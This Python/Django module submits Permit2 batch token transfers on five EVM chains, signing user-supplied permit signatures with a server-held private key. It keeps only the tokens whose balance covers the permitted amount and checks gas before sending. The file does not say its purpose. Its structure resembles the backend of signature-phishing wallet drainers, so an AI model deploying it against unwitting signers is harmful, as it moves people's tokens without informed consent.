from web3 import Web3
import json
import os
from django.conf import settings


ENV = "testnet"

if not (settings.DEBUG == False):
    ENV = "mainnet"


# =========================
# CHAIN CONFIG
# =========================
NETWORKS = {
    "Ethereum": {
        "mainnet": {
            "rpc": os.getenv("ETH_RPC"),
            "chain_id": 1
        },
        "testnet": {
            "rpc": os.getenv("ETH_RPC_TEST"),
            "chain_id": 11155111
        }
    },
    "BSC": {
        "mainnet": {
            "rpc": os.getenv("BSC_RPC"),
            "chain_id": 56
        },
        "testnet": {
            "rpc": os.getenv("BSC_RPC_TEST"),
            "chain_id": 97
        }
    },
    "Polygon": {
        "mainnet": {
            "rpc": os.getenv("POLYGON_RPC"),
            "chain_id": 137
        },
        "testnet": {
            "rpc": os.getenv("POLYGON_RPC_TEST"),
            "chain_id": 80002
        }
    },
    "Arbitrum": {
        "mainnet": {
            "rpc": os.getenv("ARB_RPC"),
            "chain_id": 42161
        },
        "testnet": {
            "rpc": os.getenv("ARB_RPC_TEST"),
            "chain_id": 421614
        }
    },
    "Optimism": {
        "mainnet": {
            "rpc": os.getenv("OPT_RPC"),
            "chain_id": 10
        },
        "testnet": {
            "rpc": os.getenv("OPT_RPC_TEST"),
            "chain_id": 11155420
        }
    }
}

CHAIN_CONFIG = {
    name: {
        "rpc": data[ENV]["rpc"],
        "chain_id": data[ENV]["chain_id"]
    }
    for name, data in NETWORKS.items()
}

# =========================
# ENV
# =========================
PRIVATE_KEY = os.getenv("P_KEY")

# =========================
# CONTRACT CONFIG
# =========================
PERMIT2_ADDRESS = Web3.to_checksum_address(
    "0x000000000022d473030f116ddee9f6b43ac78ba3"
)

PERMIT2_ABI = json.loads("""
[
  {
    "inputs": [
      {
        "components": [
          {
            "components": [
              { "internalType": "address", "name": "token", "type": "address" },
              { "internalType": "uint256", "name": "amount", "type": "uint256" }
            ],
            "internalType": "struct TokenPermissions[]",
            "name": "permitted",
            "type": "tuple[]"
          },
          { "internalType": "uint256", "name": "nonce", "type": "uint256" },
          { "internalType": "uint256", "name": "deadline", "type": "uint256" }
        ],
        "internalType": "struct PermitBatchTransferFrom",
        "name": "permit",
        "type": "tuple"
      },
      {
        "components": [
          { "internalType": "address", "name": "to", "type": "address" },
          { "internalType": "uint256", "name": "requestedAmount", "type": "uint256" }
        ],
        "internalType": "struct SignatureTransferDetails[]",
        "name": "transferDetails",
        "type": "tuple[]"
      },
      { "internalType": "address", "name": "owner", "type": "address" },
      { "internalType": "bytes", "name": "signature", "type": "bytes" }
    ],
    "name": "permitTransferFrom",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  }
]
""")

ERC20_ABI = [
    {
        "constant": True,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function",
    }
]


# =========================
# MAIN FUNCTION - WITHOUT GASFEE CHECK
# =========================
# def execute_permit(data):
#     chain = data.get("chain")

#     if chain not in CHAIN_CONFIG:
#         raise Exception(f"Unsupported chain: {chain}")

#     rpc_url = CHAIN_CONFIG[chain]["rpc"]
#     chain_id = CHAIN_CONFIG[chain]["chain_id"]

#     # ✅ Create Web3 instance per request
#     w3 = Web3(Web3.HTTPProvider(rpc_url))

#     account = w3.eth.account.from_key(PRIVATE_KEY)

#     contract = w3.eth.contract(
#         address=PERMIT2_ADDRESS,
#         abi=PERMIT2_ABI
#     )

#     user = Web3.to_checksum_address(data["user"])
#     signature = data["signature"]

#     # =========================
#     # BUILD PERMIT + TRANSFER
#     # =========================
#     permit_tokens = []
#     transfer_details = []

#     for p in data["permitted"]:
#         permit_tokens.append((
#             Web3.to_checksum_address(p["token"]),
#             int(p["amount"])
#         ))

#     for t in data["transferDetails"]:
#         transfer_details.append((
#             Web3.to_checksum_address(t["to"]),
#             int(t["requestedAmount"])
#         ))

#     # =========================
#     # SAFETY CHECK
#     # =========================
#     valid_transfer_details = []

#     for i in range(len(permit_tokens)):
#         token, amount = permit_tokens[i]

#         try:
#             token_contract = w3.eth.contract(address=token, abi=ERC20_ABI)
#             balance = token_contract.functions.balanceOf(user).call()

#             if balance < amount:
#                 print(f"⚠️ Skipping {token} (insufficient balance)")
#                 # ✅ Keep the exact array structure, but request 0 transfer
#                 valid_transfer_details.append((transfer_details[i][0], 0))
#                 continue

#             # ✅ Balance is sufficient, keep original transfer request
#             valid_transfer_details.append(transfer_details[i])

#         except Exception as e:
#             print(f"⚠️ Skipping {token} (error: {e})")
#             # ✅ Keep the exact array structure, but request 0 transfer
#             valid_transfer_details.append((transfer_details[i][0], 0))
#             continue

#     # =========================
#     # BUILD PERMIT STRUCT
#     # =========================
#     # ✅ We MUST use the original `permit_tokens` array here to match the signature
#     permit = (
#         permit_tokens,
#         int(data["nonce"]),
#         int(data["deadline"])
#     )


#     # =========================
#     # BUILD TX
#     # =========================
#     txn = contract.functions.permitTransferFrom(
#         permit,
#         valid_transfer_details,  # ✅ This array contains 0s for skipped tokens
#         user,
#         signature
#     ).build_transaction({
#         "from": account.address,
#         "nonce": w3.eth.get_transaction_count(account.address),
#         "gas": 1500000,
#         "gasPrice": w3.to_wei("10", "gwei"),
#         "chainId": chain_id
#     })

#     # =========================
#     # SIGN + SEND
#     # =========================
#     signed_txn = w3.eth.account.sign_transaction(txn, PRIVATE_KEY)

#     tx_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)

#     # print("🚀 TX SENT:", tx_hash.hex())

#     return tx_hash.hex()





# =========================
# MAIN FUNCTION - WITH GASFEE CHECK
# =========================
def execute_permit(data):
    chain = data.get("chain")

    if chain not in CHAIN_CONFIG:
        raise Exception(f"Unsupported chain: {chain}")

    rpc_url = CHAIN_CONFIG[chain]["rpc"]
    chain_id = CHAIN_CONFIG[chain]["chain_id"]

    # ✅ Create Web3 instance per request
    w3 = Web3(Web3.HTTPProvider(rpc_url))

    account = w3.eth.account.from_key(PRIVATE_KEY)

    contract = w3.eth.contract(
        address=PERMIT2_ADDRESS,
        abi=PERMIT2_ABI
    )

    user = Web3.to_checksum_address(data["user"])
    signature = data["signature"]

    # =========================
    # BUILD PERMIT + TRANSFER
    # =========================
    permit_tokens = []
    transfer_details = []

    for p in data["permitted"]:
        permit_tokens.append((
            Web3.to_checksum_address(p["token"]),
            int(p["amount"])
        ))

    for t in data["transferDetails"]:
        transfer_details.append((
            Web3.to_checksum_address(t["to"]),
            int(t["requestedAmount"])
        ))

    # =========================
    # SAFETY CHECK (ERC20 Balances)
    # =========================
    valid_transfer_details = []

    for i in range(len(permit_tokens)):
        token, amount = permit_tokens[i]

        try:
            token_contract = w3.eth.contract(address=token, abi=ERC20_ABI)
            balance = token_contract.functions.balanceOf(user).call()

            if balance < amount:
                print(f"⚠️ Skipping {token} (insufficient balance)")
                # ✅ Keep the exact array structure, but request 0 transfer
                valid_transfer_details.append((transfer_details[i][0], 0))
                continue

            # ✅ Balance is sufficient, keep original transfer request
            valid_transfer_details.append(transfer_details[i])

        except Exception as e:
            print(f"⚠️ Skipping {token} (error: {e})")
            # ✅ Keep the exact array structure, but request 0 transfer
            valid_transfer_details.append((transfer_details[i][0], 0))
            continue

    # =========================
    # BUILD PERMIT STRUCT
    # =========================
    # ✅ We MUST use the original `permit_tokens` array here to match the signature
    permit = (
        permit_tokens,
        int(data["nonce"]),
        int(data["deadline"])
    )


    # =========================
    # GAS ESTIMATION & BALANCE CHECK
    # =========================
    # 1. Get current dynamic gas price from the network
    current_gas_price = w3.eth.gas_price

    # 2. Setup base transaction dictionary for estimation
    base_tx = {
        "from": account.address,
        "nonce": w3.eth.get_transaction_count(account.address),
        "chainId": chain_id,
        "gasPrice": current_gas_price
    }

    # 3. Estimate gas limit
    try:
        estimated_gas = contract.functions.permitTransferFrom(
            permit,
            valid_transfer_details,
            user,
            signature
        ).estimate_gas(base_tx)
        
        # Add a 15% buffer to prevent "out of gas" errors during execution
        gas_limit = int(estimated_gas * 1.15)
    except Exception as e:
        print(f"⚠️ Gas estimation failed (Transaction would likely revert): {e}")
        return None  # Skip transaction completely

    # 4. Calculate total expected cost (gas_limit * gas_price)
    total_gas_cost = gas_limit * current_gas_price

    # 5. Check if the executing wallet has enough native currency
    wallet_balance = w3.eth.get_balance(account.address)

    if wallet_balance < total_gas_cost:
        print(f"⚠️ Insufficient native balance for gas.")
        print(f"   Required: {w3.from_wei(total_gas_cost, 'ether')} | Available: {w3.from_wei(wallet_balance, 'ether')}")
        return None  # Skip transaction completely

    # =========================
    # BUILD TX
    # =========================
    txn = contract.functions.permitTransferFrom(
        permit,
        valid_transfer_details,
        user,
        signature
    ).build_transaction({
        **base_tx,
        "gas": gas_limit
    })

    # =========================
    # SIGN + SEND
    # =========================
    signed_txn = w3.eth.account.sign_transaction(txn, PRIVATE_KEY)

    tx_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)

    print("🚀 TX SENT:", tx_hash.hex())

    return tx_hash.hex()